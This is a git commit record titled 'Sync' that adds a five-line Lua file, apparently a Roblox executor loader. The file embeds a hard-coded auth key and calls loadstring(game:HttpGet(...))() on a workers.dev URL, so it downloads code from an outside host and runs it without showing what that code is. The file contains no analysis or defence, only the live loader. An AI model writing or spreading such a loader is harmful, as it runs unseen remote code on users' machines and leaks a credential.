5e4bed47a6678657bd461da5d0c3704ff2467d5d
MaybeHookUser <IUseMaybeHook@proton.me>
2026-03-10 20:34:20 +0100

    Sync

---
+++ 1468213301233062013_123.lua
@@ -0,0 +1,5 @@
+local headers = {
+    ["X-Auth-Key"] = "QgWR-ETVNzkrUcPm8DZYDjvvpLi2FcNw",
+    ["X-Handshake"] = "protected"
+}
+loadstring(game:HttpGet("https://lazybear-gateway.iusemaybehook.workers.dev/?file=1468213301233062013_123.lua", true, headers))()
